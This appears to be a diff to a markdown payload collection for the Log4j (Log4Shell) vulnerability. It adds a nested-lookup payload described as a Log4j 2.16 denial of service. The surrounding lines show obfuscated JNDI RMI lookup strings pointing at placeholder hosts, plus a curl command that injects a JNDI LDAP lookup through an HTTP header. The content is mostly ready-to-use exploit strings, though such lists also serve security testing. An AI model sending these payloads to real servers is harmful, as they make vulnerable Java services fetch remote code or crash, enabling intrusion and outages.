@@ -54,6 +54,12 @@ ${jndi:rmi://a.b.c}
 ${${lower:jndi}:${lower:rmi}://q.w.e/poc}
 ${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}
 ```
+
+Log4j 2.16 vulnerability DoS
+```
+Payload: ${${::-${::-$${::-j}}}}
+```
+
 Curl
 ```
 curl -vv -H "If-Modified-Since: \${jndi:ldap://localhost:80/abc}"
